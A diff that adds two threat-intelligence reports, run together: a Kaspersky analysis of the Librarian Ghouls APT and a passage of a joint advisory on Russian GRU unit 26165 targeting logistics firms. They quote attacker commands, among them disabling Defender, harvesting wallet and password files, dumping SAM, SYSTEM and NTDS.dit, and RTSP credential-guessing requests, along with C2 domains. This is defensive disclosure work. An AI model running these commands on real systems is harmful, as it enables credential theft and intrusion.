@@ -1,0 +1,2805 @@
+Introduction
+Librarian Ghouls, also known as “Rare Werewolf” and “Rezet”, is an APT group that targets entities in Russia and the CIS. Other security vendors are also monitoring this APT and releasing analyses of its campaigns. The group has remained active through May 2025, consistently targeting Russian companies.
+
+A distinctive feature of this threat is that the attackers favor using legitimate third-party software over developing their own malicious binaries. The malicious functionality of the campaign described in this article is implemented through command files and PowerShell scripts. The attackers establish remote access to the victim’s device, steal credentials, and deploy an XMRig crypto miner in the system.
+
+Our research has uncovered new tools within this APT group’s arsenal, which we will elaborate on in this article.
+
+Technical details
+Initial infection vector
+Attacks by Librarian Ghouls continued almost unabated throughout 2024. We observed a slight decline in the group’s activity in December, followed immediately by a new wave of attacks, which is ongoing. The group’s primary initial infection vector involves targeted phishing emails that contain password-protected archives with executable files inside. These malicious emails are typically disguised as messages from legitimate organizations, containing attachments that appear to be official documents. The infection process is as follows: the victim opens the attached archive (the password is usually provided in the email body), extracts the files inside, and opens them.
+
+We managed to get hold of a malicious implant from an archive disguised as a payment order. The sample is a self-extracting installer made with the Smart Install Maker utility for Windows.
+
+The installer contains three files: an archive, a configuration file, and an empty file irrelevant for our analysis. They are later renamed into data.cab, installer.config and runtime.cab respectively.
+
+The primary malicious logic resides in the installer’s configuration file. It uses a variety of registry modification commands to automatically deploy the legitimate window manager, 4t Tray Minimizer, onto the system. This software can minimize running applications to the system tray, allowing attackers to obscure their presence on the compromised system.
+
+Once 4t Tray Minimizer is installed, the installer pulls three files from data.cab and puts them into the C:\Intel directory, specifically at:
+
+File	Name when archived	Path on the infected system
+Legitimate PDF as a decoy	0	 \Intel\Payment Order # 131.pdf
+Legitimate curl utility executable	1	\Intel\curl.exe
+LNK file	2	\Intel\AnyDesk\bat.lnk
+The PDF decoy resembles an order to pay a minor amount:
+
+PDF document imitating a payment order
+PDF document imitating a payment order
+
+rezet.cmd
+Once data.cab is unpacked, the installer generates and executes a rezet.cmd command file, which then reaches out to the C2 server downdown[.]ru, hosting six files with the JPG extension. rezet.cmd downloads these to C:\Intel, changing their file extensions to: driver.exe, blat.exe, svchost.exe, Trays.rar, wol.ps1, and dc.exe.
+
+driver.exe is a customized build of rar.exe, the console version of WinRAR 3.80. This version has had user dialog strings removed: it can execute commands but provides no meaningful output to the console.
+blat.exe is Blat, a legitimate utility for sending email messages and files via SMTP. Attackers use this to send data they steal to an email server they control.
+svchost.exe is the remote access application AnyDesk. Attackers use this to remotely control the compromised machine.
+dc.exe is Defender Control, which allows disabling Windows Defender.
+After downloading the files, the script uses the specified password and the driver.exe console utility to extract Trays.rar into the same C:\Intel directory and run the unpacked Trays.lnk. This shortcut allows starting 4t Tray Minimizer minimized to the tray.
+
+Next, the script installs AnyDesk on the compromised device and downloads a bat.bat file from the C2 server to C:\Intel\AnyDesk. Finally, rezet.cmd runs bat.lnk, which was previously extracted from data.cab.
+
+bat.bat
+Opening the bat.lnk shortcut runs the bat.bat batch file, which executes a series of malicious actions.
+
+Disabling security measures and a scheduled task
+First, the BAT file sets the password QWERTY1234566 for AnyDesk, which allows the attackers to connect to the victim’s device without asking for confirmation.
+
+Next, the script uses the previously downloaded Defender Control (dc.exe) application to disable Windows Defender.
+
+To verify that the victim’s computer is on and available for remote connections, the batch file runs the powercfg utility six times with different parameters. This utility controls the local machine’s power settings.
+
+Next, bat.bat runs the schtasks utility to create a ShutdownAt5AM scheduler task, which shuts down the victim’s PC every day at 5 AM as the name suggests. It is our assessment that the attackers use this technique to cover their tracks so that the user remains unaware that their device has been hijacked.
+
+echo QWERTY1234566 | AnyDesk.exe --set-password _unattended_access
+%SYSTEMDRIVE%\Intel\dc.exe /D
+ 
+powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0
+powercfg -change -standby-timeout-ac 0
+powercfg -change -hibernate-timeout-ac 0
+powercfg -h off
+powercfg /SETDCVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 1
+powercfg /SETACVALUEINDEX SCHEME_CURRENT 238c9fa8-0aad-41ed-83f4-97be242c8f20 bd3b718a-0680-4d9d-8ab2-e1d2b4ac806d 1
+schtasks /create /tn "ShutdownAt5AM" /tr "shutdown /s /f /t 0" /sc daily /st 05:00
+
+Disabling security measures and the power management configuration in bat.bat
+
+Wakeup script and data theft
+Next, the batch file executes the wol.ps1 script via PowerShell.
+
+$Action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+$Trigger = New-ScheduledTaskTrigger -Daily -At "01:00AM"
+$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+# Creating task settings
+$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -WakeToRun
+# Registering task in Task Scheduler
+Register-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -TaskName "WakeUpAndLaunchEdge" -Settings $TaskSettings -Force
+
+Contents of the “wol.ps1” script
+
+This script launches Microsoft Edge every day at 1 AM. We found no evidence of msedge.exe being replaced or compromised, leading us to believe it is a genuine Microsoft Edge executable. This daily browser activation wakes the victim’s computer, giving attackers a four-hour window to establish unauthorized remote access with AnyDesk before the scheduled task shuts the machine down at 5 AM.
+
+Following the execution of the PowerShell script, bat.bat removes the curl utility, the Trays.rar archive, and the AnyDesk installer. The attackers no longer need these components: at this stage of the infection, all necessary malicious files and third-party utilities have been downloaded with curl, Trays.rar has been unpacked, and AnyDesk has been installed on the device.
+
+After that, the batch file sets environment variables for Blat. These variables contain, among other things, the email addresses where the victim’s data will be sent and the passwords for these accounts.
+
+The next step is to collect information stored on the device that is of interest to the attackers:
+
+Cryptocurrency wallet credentials and seed phrases
+Dumps of the HKLM\SAM and HKLM\SYSTEM registry keys made with reg.exe
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*парол*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*карт*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*кошельк*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\wallet.dat /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*wallet*.doc* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*wallet*.txt /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*seed*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\keystore.json /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*bitcoin*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*usdt*.* /y
+ 
+%SYSTEMDRIVE%\Intel\driver.exe a -r -[REDACTED] %SYSTEMDRIVE%\Intel\wallet.rar  C:\*ethereum*.* /y
+ 
+reg save hklm\sam %SYSTEMDRIVE%\Intel\sam.backup
+reg save hklm\system %SYSTEMDRIVE%\Intel\system.backup
+Data collection by bat.bat
+
+The BAT file uses driver.exe to pack data it has collected into two separate password-protected archives. Then, the script runs blat.exe to send the victim’s data and AnyDesk configuration files to the attackers via SMTP.
+
+Miner installation and self-deletion
+Next, bat.bat deletes the files generated during the attack from the C:\Intel\ folder and installs a crypto miner on the compromised system. To do this, the script creates a bm.json configuration file containing the mining pool address and the attackers’ identifier, and then downloads install.exe from hxxp://bmapps[.]org/bmcontrol/win64/Install.exe.
+
+install.exe is an installer that checks for the JSON configuration file and the bmcontrol.exe process in the system. If the process is detected, the installer terminates it.
+
+Then, install.exe downloads an archive with mining tools from hxxps://bmapps[.]org/bmcontrol/win64/app-1.4.zip.
+
+The archive contains the following files:
+
+_install.exe: a new version of the installer. While the samples in the attacks we analyzed were identical, we suspect the attackers have a scenario for updating the malware.
+bmcontrol.exe: miner controller
+run.exe, stop.cmd, uninstall.cmd: tools for starting, stopping, and removing the controller
+XMRig miner
+Depending on the parameters of the JSON file, the unmodified original installer file is used, or _install.exe is renamed to install.exe and run. After that, the installer adds run.exe to autorun. This utility checks for an already running bmcontrol.exe controller on the compromised system, and if it doesn’t find one, runs it from the downloaded archive.
+
+Once running, bmcontrol.exe creates two processes: master and worker. The master process launches and constantly monitors the worker, and also restarts it if the latter quits unexpectedly. In addition, the master passes the JSON configuration file to the worker process.
+
+Before launching the XMRig miner, the worker process collects the following system information:
+
+Available CPU cores
+Available RAM
+GPU
+This data is used to configure the miner on the compromised device and also sent to the attackers’ server. While XMRig is running, the worker maintains a connection to the mining pool, sending a request every 60 seconds.
+
+After installing the miner on the system, bat.bat removes itself from the victim’s device.
+
+Legitimate software utilized by the attackers
+It is a common technique to leverage third-party legitimate software for malicious purposes (T1588.002), which makes detecting and attributing APT activity more difficult. We have seen this pattern in current campaigns by various APT groups, in particular in the Likho cluster.
+
+Beyond the utilities discussed above, we also identified the following software in Librarian Ghouls attacks:
+
+Mipko Personal Monitor: a DLP system that the attackers use to monitor the victim. The application can collect screenshots and record keystrokes among other things.
+WebBrowserPassView: a password recovery utility that can extract passwords stored in web browsers. The attackers use this to steal victims’ credentials.
+ngrok: a global reverse proxy that secures and accelerates network services. Used by the attackers to connect to target machines.
+NirCmd: a legitimate utility that facilitates various OS tasks without a visible user interface. The attackers use this to covertly run scripts and executables.
+Phishing campaign
+Our investigation revealed several domains that we assess with low confidence to be associated with the ongoing Librarian Ghouls campaign. At the time of the investigation, some of them remained active, including users-mail[.]ru and deauthorization[.]online. These domains hosted phishing pages, generated with PHP scripts and designed to harvest credentials for the mail.ru email service.
+
+Example of a phishing page associated with the APT campaign
+Example of a phishing page associated with the APT campaign
+
+Infrastructure
+The implant detailed in this article communicated with the command-and-control servers downdown[.]ru and dragonfires[.]ru. Both resolve to the IP address 185.125.51[.]5.
+
+Our analysis of the attackers’ infrastructure revealed a notable characteristic: several malicious web servers associated with this campaign had directory listing enabled, allowing us to inspect files they stored.
+
+Directory listing on a malicious server
+Directory listing on a malicious server
+
+Victims
+Our telemetry indicated that, during the investigation period, hundreds of Russian users fell victim to this campaign. It primarily focuses on industrial enterprises, with engineering schools also being a target of interest. Furthermore, the attacks described also impacted users in Belarus and Kazakhstan.
+
+The phishing emails are notably composed in Russian and include archives with Russian filenames, along with Russian-language decoy documents. This suggests that the primary targets of this campaign are likely based in Russia or speak Russian.
+
+About the attackers
+Librarian Ghouls APT exhibits traits commonly associated with hacktivist groups, such as the use of self-extracting archives and a reliance on legitimate, third-party utilities rather than custom-built malware binary modules.
+
+Since the beginning of the current campaign in December 2024, we have seen frequent updates to the implants, which vary in configuration files and the bundled sets of legitimate utilities. At the time of publishing this, our data encompassed over 100 malicious files connected to this campaign.
+
+Takeaways
+At the time of this report’s release, the Librarian Ghouls APT campaign described in it is still active, as evidenced by attacks we observed in May 2025. Consistent with previous activity, the attackers leverage third-party legitimate utilities rather than developing custom tools. All of the malicious functionality still relies on installer, command, and PowerShell scripts. We observe that the attackers are continuously refining their tactics, encompassing not only data exfiltration but also the deployment of remote access tools and the use of phishing sites for email account compromise. We constantly monitor this threat actor and will continue to share up-to-date information about its activity.
+
+Indicators of compromise
+* Additional indicators of compromise and a YARA rule for detecting Librarian Ghouls activity are available to customers of our APT Intelligence Reporting service. Contact intelreports@kaspersky.com for more details.
+
+Implants
+d8edd46220059541ff397f74bfd271336dda702c6b1869e8a081c71f595a9e68
+2f3d67740bb7587ff70cc7319e9fe5c517c0e55345bf53e01b3019e415ff098b
+de998bd26ea326e610cc70654499cebfd594cc973438ac421e4c7e1f3b887617
+785a5b92bb8c9dbf52cfda1b28f0ac7db8ead4ec3a37cfd6470605d945ade40e
+c79413ef4088b3a39fe8c7d68d2639cc69f88b10429e59dd0b4177f6b2a92351
+53fd5984c4f6551b2c1059835ea9ca6d0342d886ba7034835db2a1dd3f8f5b04
+
+Implant configuration files
+f8c80bbecbfb38f252943ee6beec98edc93cd734ec70ccd2565ab1c4db5f072f
+4d590a9640093bbda21597233b400b037278366660ba2c3128795bc85d35be72
+1b409644e86559e56add5a65552785750cd36d60745afde448cce7f6f3f09a06
+7c4a99382dbbd7b5aaa62af0ccff68aecdde2319560bbfdaf76132b0506ab68a
+702bf51811281aad78e6ca767586eba4b4c3a43743f8b8e56bb93bc349cb6090
+311ec9208f5fe3f22733fca1e6388ea9c0327be0836c955d2cf6a22317d4bdca
+
+Malicious archive attachments
+fd58900ea22b38bad2ef3d1b8b74f5c7023b8ca8a5b69f88cfbfe28b2c585baf
+e6ea6ce923f2eee0cd56a0874e4a0ca467711b889553259a995df686bd35de86
+6954eaed33a9d0cf7e298778ec82d31bfbdf40c813c6ac837352ce676793db74
+
+Malicious BAT files
+e880a1bb0e7d422b78a54b35b3f53e348ab27425f1c561db120c0411da5c1ce9
+c353a708edfd0f77a486af66e407f7b78583394d7b5f994cd8d2e6e263d25968
+636d4f1e3dcf0332a815ce3f526a02df3c4ef2890a74521d05d6050917596748
+c5eeec72b5e6d0e84ff91dfdcbefbbbf441878780f887febb0caf3cbe882ec72
+8bdb8df5677a11348f5787ece3c7c94824b83ab3f31f40e361e600576909b073
+2af2841bf925ed1875faadcbb0ef316c641e1dcdb61d1fbf80c3443c2fc9454f
+
+Decoy documents
+cab1c4c675f1d996b659bab1ddb38af365190e450dec3d195461e4e4ccf1c286
+dfac7cd8d041a53405cc37a44f100f6f862ed2d930e251f4bf22f10235db4bb3
+977054802de7b583a38e0524feefa7356c47c53dd49de8c3d533e7689095f9ac
+65f7c3e16598a8cb279b86eaeda32cb7a685801ed07d36c66ff83742d41cd415
+a6ff418f0db461536cff41e9c7e5dba3ee3b405541519820db8a52b6d818a01e
+6c86608893463968bfda0969aa1e6401411c0882662f3e70c1ac195ee7bd1510
+
+Malicious PS1 scripts
+8b6afbf73a9b98eec01d8510815a044cd036743b64fef955385cbca80ae94f15
+7d6b598eaf19ea8a571b4bd79fd6ff7928388b565d7814b809d2f7fdedc23a0a
+01793e6f0d5241b33f07a3f9ad34e40e056a514c5d23e14dc491cee60076dc5a
+
+Miner installer (install.exe)
+649ee35ad29945e8dd6511192483dddfdfe516a1312de5e0bd17fdd0a258c27f
+
+Miner controller (bmcontrol.exe)
+9cce3eaae0be9b196017cb6daf49dd56146016f936b66527320f754f179c615f
+
+Miner launcher (run.exe)
+d7bcab5acc8428026e1afd694fb179c5cbb74c5be651cd74e996c2914fb2b839
+
+Legitimate software
+AnyDesk
+Blat
+curl
+Defender Control
+Customized RAR 3.80
+AnyDesk
+Mipko Personal Monitor
+ngrok
+NirCmd
+4t Tray Minimizer
+WebBrowserPassView
+
+Librarian Ghouls malicious domains
+vniir[.]space
+vniir[.]nl
+hostingforme[.]nl
+mail-cheker[.]nl
+unifikator[.]ru
+outinfo[.]ru
+anyhostings[.]ru
+center-mail[.]ru
+redaction-voenmeh[.]info
+acountservices[.]nl
+accouts-verification[.]ru
+office-email[.]ru
+email-office[.]ru
+email-informer[.]ru
+office-account[.]ru
+deauthorization[.]online
+anyinfos[.]ru
+verifikations[.]ru
+claud-mail[.]ru
+users-mail[.]ru
+detectis[.]ru
+supersuit[.]site
+downdown[.]ru
+dragonfires[.]ru
+bmapps[.]org
+Executive Summary
+This joint cybersecurity advisory (CSA) highlights a Russian state-sponsored cyber campaign targeting Western logistics entities and technology companies. This includes those involved in the coordination, transport, and delivery of foreign assistance to Ukraine. Since 2022, Western logistics entities and IT companies have faced an elevated risk of targeting by the Russian General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (85th GTsSS), military unit 26165—tracked in the cybersecurity community under several names (see “Cybersecurity Industry Tracking”). The actors’ cyber espionage-oriented campaign, targeting technology companies and logistics entities, uses a mix of previously disclosed tactics, techniques, and procedures (TTPs). The authoring agencies expect similar targeting and TTP use to continue.
+
+Executives and network defenders at logistics entities and technology companies should recognize the elevated threat of unit 26165 targeting, increase monitoring and threat hunting for known TTPs and indicators of compromise (IOCs), and posture network defenses with a presumption of targeting.
+
+This cyber espionage-oriented campaign targeting logistics entities and technology companies uses a mix of previously disclosed TTPs and is likely connected to these actors’ wide scale targeting of IP cameras in Ukraine and bordering NATO nations.
+
+The following authors and co-sealers are releasing this CSA:
+
+United States National Security Agency (NSA)
+United States Federal Bureau of Investigation (FBI)
+United Kingdom National Cyber Security Centre (NCSC-UK)
+Germany Federal Intelligence Service (BND) Bundesnachrichtendienst
+Germany Federal Office for Information Security (BSI) Bundesamt für Sicherheit in der Informationstechnik
+Germany Federal Office for the Protection of the Constitution (BfV) Bundesamt für Verfassungsschutz
+Czech Republic Military Intelligence (VZ)  Vojenské zpravodajství
+Czech Republic National Cyber and Information Security Agency (NÚKIB) Národní úřad pro kybernetickou a informační bezpečnost
+Czech Republic Security Information Service (BIS) Bezpečnostní informační služba
+Poland Internal Security Agency (ABW) Agencja Bezpieczeństwa Wewnętrznego
+Poland Military Counterintelligence Service (SKW) Służba Kontrwywiadu Wojskowego
+United States Cybersecurity and Infrastructure Security Agency (CISA)
+United States Department of Defense Cyber Crime Center (DC3)
+United States Cyber Command (USCYBERCOM)
+Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)
+Canadian Centre for Cyber Security (CCCS)
+Danish Defence Intelligence Service (DDIS) Forsvarets Efterretningstjeneste
+Estonian Foreign Intelligence Service (EFIS) Välisluureamet
+Estonian National Cyber Security Centre (NCSC-EE) Küberturvalisuse keskus
+French Cybersecurity Agency (ANSSI) Agence nationale de la sécurité des systèmes d'information
+Netherlands Defence Intelligence and Security Service (MIVD) Militaire Inlichtingen- en Veiligheidsdienst
+ 
+Download the PDF version of this report:
+
+Russian GRU Targeting Western Logistics Entities and Technology Companies (PDF, 1,081KB)
+For a downloadable list of IOCs, visit:
+
+AA25-141A STIX XML
+(XML, 117.02 KB )
+AA25-141A STIX JSON
+(JSON, 144.29 KB )
+Introduction
+For over two years, the Russian GRU 85th GTsSS, military unit 26165—commonly known in the cybersecurity community as APT28, Fancy Bear, Forest Blizzard, BlueDelta, and a variety of other identifiers—has conducted this campaign using a mix of known tactics, techniques, and procedures (TTPs), including reconstituted password spraying capabilities, spearphishing, and modification of Microsoft Exchange mailbox permissions.
+
+In late February 2022, multiple Russian state-sponsored cyber actors increased the variety of cyber operations for purposes of espionage, destruction, and influence—with unit 26165 predominately involved in espionage. [1] As Russian military forces failed to meet their military objectives and Western countries provided aid to support Ukraine’s territorial defense, unit 26165 expanded its targeting of logistics entities and technology companies involved in the delivery of aid. These actors have also targeted Internet-connected cameras at Ukrainian border crossings to monitor and track aid shipments.
+
+Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 17. See Appendix A: MITRE ATT&CK tactics and techniques for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. This advisory uses the MITRE D3FEND® framework, version 1.0.
+
+Description of Targets
+The GRU unit 26165 cyber campaign against Western logistics providers and technology companies has targeted dozens of entities, including government organizations and private/commercial entities across virtually all transportation modes: air, sea, and rail. These actors have targeted entities associated with the following verticals within NATO member states, Ukraine, and at international organizations: 
+
+ Defense Industry
+Transportation and Transportation Hubs (ports, airports, etc.)
+Maritime
+Air Traffic Management
+IT Services
+In the course of the targeting lifecycle, unit 26165 actors identified and conducted follow-on targeting of additional entities in the transportation sector that had business ties to the primary target, exploiting trust relationships to attempt to gain additional access [T1199].
+
+The actors also conducted reconnaissance on at least one entity involved in the production of industrial control system (ICS) components for railway management, though a successful compromise was not confirmed [TA0043].
+
+The countries with targeted entities include the following, as illustrated in Figure 1:
+
+Bulgaria
+Czech Republic
+France
+Germany
+Greece
+Italy
+Moldova
+Netherlands
+Poland
+Romania
+Slovakia
+Ukraine
+United States
+ 
+Map demonstrating Targeted Entities
+Figure 1: Countries with Targeted Entities
+Initial Access TTPs
+To gain initial access to targeted entities, unit 26165 actors used several techniques to gain initial access to targeted entities, including (but not limited to):
+
+Credential guessing [T1110.001] / brute force [T1110.003]
+Spearphishing for credentials [T1566]
+Spearphishing delivering malware [T1566]
+Outlook NTLM vulnerability (CVE-2023-23397)
+Roundcube vulnerabilities (CVE-2020-12641, CVE-2020-35730, CVE-2021-44026)
+Exploitation of Internet-facing infrastructure, including corporate VPNs [T1133], via public vulnerabilities and SQL injection [T1190]
+Exploitation of WinRAR vulnerability (CVE-2023-38831)
+The actors abused vulnerabilities associated with a range of brands and models of small office/home office (SOHO) devices to facilitate covert cyber operations, as well as proxy malicious activity via devices with geolocation in proximity to the target [T1665]. [2]
+
+Credential Guessing/Brute Force
+Unit 26165 actors’ credential guessing [T1110.001] operations in this campaign exhibit some similar characteristics to those disclosed in the previous CSA “Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.” [3] Based on victim network investigations, the current iteration of this TTP employs a similar blend of anonymization infrastructure, including the use of Tor and commercial VPNs [T1090.003]. The actors frequently rotated the IP addresses used to further hamper detection. All observed connections were made via encrypted TLS [T1573]. 
+
+Spearphishing
+GRU unit 26165 actors’ spearphishing emails included links [T1566.002] leading to fake login pages impersonating a variety of government entities and Western cloud email providers’ webpages. These webpages were typically hosted on free third-party services or compromised SOHO devices and often used legitimate documents associated with thematically similar entities as lures. The subjects of spearphishing emails were diverse and ranged from professional topics to adult themes. Phishing emails were frequently sent via compromised accounts or free webmail accounts [T1586.002, T1586.003]. The emails were typically written in the target’s native language and sent to a single targeted recipient. 
+
+Some campaigns employed multi-stage redirectors [T1104] verifying IP-geolocation [T1627.001] and browser fingerprints [T1627] to protect credential harvesting infrastructure or provide multifactor authentication (MFA) [T1111] and CAPTCHA relaying capabilities [T1056]. Connecting endpoints failing the location checks were redirected to a benign URL [T1627], such as msn.com. Redirector services used include:
+
+Webhook[.]site
+FrgeIO
+InfinityFree
+Dynu
+Mocky
+Pipedream
+Mockbin[.]org
+The actors also used spearphishing to deliver malware (including HEADLACE and MASEPIE) executables [T1204.002] delivered via third-party services and redirectors [T1566.002], scripts in a mix of languages [T1059] (including BAT [T1059.003] and VBScript [T1059.005]) and links to hosted shortcuts [T1204.001].
+
+CVE Usage
+Throughout this campaign, GRU unit 26165 weaponized an Outlook NTLM vulnerability (CVE-2023-23397) to collect NTLM hashes and credentials via specially crafted Outlook calendar appointment invitations [T1187]. [4],[5] These actors also used a series of Roundcube CVEs (CVE-2020-12641, CVE-2020-35730, and CVE-2021-44026) to execute arbitrary shell commands [T1059], gain access to victim email accounts, and retrieve sensitive data from email servers [T1114].
+
+Since at least fall 2023, the actors leveraged a WinRAR vulnerability (CVE-2023-38831) allowing for the execution of arbitrary code embedded in an archive as a means of initial access [T1659]. The actors sent emails with malicious attachments [T1566.001] or embedded hyperlinks [T1566.002] that downloaded a malicious archive prepared using this CVE. 
+
+Post-Compromise TTPs
+After an initial compromise using one of the above techniques, unit 26165 actors conducted contact information reconnaissance to identify additional targets in key positions [T1589.002]. The actors also conducted reconnaissance of the cybersecurity department [T1591], individuals responsible for coordinating transport [T1591.004], and other companies cooperating with the victim entity [T1591.002].
+
+The actors used native commands and open source tools, such as Impacket and PsExec, to move laterally within the environment [TA0008]. Multiple Impacket scripts were used as .exe files, in addition to the python versions, depending on the victim environment. The actors also moved laterally within the network using Remote Desktop Protocol (RDP) [T1021.001] to access additional hosts and attempt to dump Active Directory NTDS.dit domain databases [T1003.003] using native Active Directory Domain Services commands, such as in Figure 2: Example Active Directory Domain Services command:
+
+Figure 2: Example Active Directory Domain Services command
+C:\Windows\system32\ntdsutil.exe "activate instance ntds" ifm "create full C:\temp\[a-z]{3}" quit quit
+Additionally, GRU unit 26165 actors used the tools Certipy and ADExplorer.exe to exfiltrate information from the Active Directory. The actors installed python [T1059.006] on infected machines to enable the execution of Certipy. Accessed files were archived in .zip files prior to exfiltration [T1560]. The actors attempted to exfiltrate archived data via a previously dropped OpenSSH binary [T1048].
+
+Incident response investigations revealed that the actors would take steps to locate and exfiltrate lists of Office 365 users and set up sustained email collection. The actors used manipulation of mailbox permissions [T1098.002] to establish sustained email collection at compromised logistics entities, as detailed in a Polish Cybercommand blog. [6]
+
+After initial authentication, unit 26165 actors would change accounts' folder permissions and enroll compromised accounts in MFA mechanisms to increase the trust-level of compromised accounts and enable sustained access [T1556.006]. The actors leveraged python scripts to retrieve plaintext passwords via Group Policy Preferences [T1552.006] using Get-GPPPassword.py and a modified ldap-dump.py to enumerate the Windows environment [T1087.002] and conduct a brute force password spray [T1110.003] via Lightweight Directory Access Protocol (LDAP). The actors would additionally delete event logs through the wevtutil utility [T1070.001].
+
+After gaining initial access to the network, the actors pursued further access to accounts with access to sensitive information on shipments, such as train schedules and shipping manifests. These accounts contained information on aid shipments to Ukraine, including: 
+
+sender,
+recipient,
+train/plane/ship numbers,
+point of departure,
+destination,
+container registration numbers,
+travel route, and
+cargo contents. 
+In at least one instance, the actors attempted to use voice phishing [T1566.004] to gain access to privileged accounts by impersonating IT staff.
+
+Malware
+Unit 26165’s use of malware in this campaign ranged from gaining initial access to establishing persistence and exfiltrating data. In some cases, the attack chain resulted in multiple pieces of malware being deployed in succession. The actors used dynamic link library (DLL) search order hijacking [T1574.001] to facilitate malware execution. There were a number of known malware variants tied to this campaign against logistics sector victims, including:
+
+HEADLACE [7]
+MASEPIE [8]
+While other malware variants, such as OCEANMAP and STEELHOOK, [8] were not directly observed targeting logistics or IT entities, their deployment against victims in other sectors in Ukraine and other Western countries suggest that they could be deployed against logistics and IT entities should the need arise. 
+
+Persistence
+In addition to the abovementioned mailbox permissions abuse, unit 26165 actors also used scheduled tasks [T1053.005], run keys [T1547.001], and placed malicious shortcuts [T1547.009] in the startup folder to establish persistence. 
+
+Exfiltration
+GRU unit 26165 actors used a variety of methods for data exfiltration that varied based on the victim environment, including both malware and living off the land binaries. PowerShell commands [T1059.001] were often used to prepare data for exfiltration; for example, the actors prepared zip archives [T1560.001] for upload to their own infrastructure. 
+
+The actors also used server data exchange protocols and Application Programming Interfaces (APIs) such as Exchange Web Services (EWS) and Internet Message Access Protocol (IMAP) [T1114.002] to exfiltrate data from email servers. In multiple instances, the actors used periodic EWS queries [T1119] to collect new emails sent and received since the last data exfiltration [T1029]. The actors typically used infrastructure in close geographic proximity to the victim. Long gaps between exfiltration, the use of trusted and legitimate protocols, and the use of local infrastructure allowed for long-term collection of sensitive data to go undetected. 
+
+Connections to Targeting of IP Cameras
+In addition to targeting logistics entities, unit 26165 actors likely used access to private cameras at key locations, such as near border crossings, military installations, and rail stations, to track the movement of materials into Ukraine. The actors also used legitimate municipal services, such as traffic cams. 
+
+The actors targeted Real Time Streaming Protocol (RTSP) servers hosting IP cameras primarily located in Ukraine as early as March 2022 in a large-scale campaign, which included attempts to enumerate devices [T1592] and gain access to the cameras’ feeds [T1125]. Actor-controlled servers sent RTSP DESCRIBE requests destined for RTSP servers, primarily hosting IP cameras [T1090.002]. The DESCRIBE requests were crafted to obtain access to IP cameras located on logically distinct networks from that of the routers that received the request. The requests included Base64-encoded credentials for the RTSP server, which included publicly documented default credentials and likely generic attempts to brute force access to the devices [T1110]. An example of an RTSP request is shown in Figure 3.
+
+Figure 3: Example RTSP request
+DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0
+
+CSeq: 1
+
+Authorization: Basic <Base64-encoded credentials>
+
+User-Agent: WebClient
+
+Accept: application/sdp
+
+ 
+
+DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0
+
+CSeq: 2
+
+Authorization: Digest username="admin", realm="[a-f0-9]{12}", algorithm="MD5", nonce="[a-f0-9]{32}", uri="", response="[a-f0-9]{32}"
+
+User-Agent: WebClient
+
+Accept: application/sdp
+
+Successful RTSP 200 OK responses contained a snapshot of the IP camera's image and IP camera metadata such as video codec, resolution, and other properties depending on the IP camera's configuration. 
+
+From a sample available to the authoring agencies of over 10,000 cameras targeted via this effort, the geographic distribution of victims showed a strong focus on cameras in Ukraine and border countries, as shown in Table 1:
+
+Table 1: Geographic distribution of targeted IP cameras
+Country	Percentage of Total Attempts
+Ukraine	81.0%
+Romania	9.9%
+Poland	4.0%
+Hungary	2.8%
+Slovakia	1.7%
+Others	0.6%
+Mitigation Actions
+General Security Mitigations
+Architecture and Configuration
+
+Employ appropriate network segmentation [D3-NI] and restrictions to limit access and utilize additional attributes (such as device information, environment, and access path) when making access decisions [D3-AMED].
+Consider Zero Trust principles when designing systems. Base product choices on how those products can solve specific risks identified as part of the end-to-end design. [9]
+Ensure that host firewalls and network security appliances (e.g., firewalls) are configured to only allow legitimately needed data flows between devices and servers to prevent lateral movement [D3-ITF]. Alert on attempts to connect laterally between host devices or other unusual data flows.
+Use automated tools to audit access logs for security concerns and identify anomalous access requests [D3-RAPA].
+For organizations using on-premises authentication and email services, block and alert on NTLM/SMB requests to external infrastructure [D3-OTF].
+Utilize endpoint, detection, and response (EDR) and other cybersecurity solutions on all systems, prioritizing high value systems with large amounts of sensitive data such as mail servers and domain controllers [D3-PM] first.
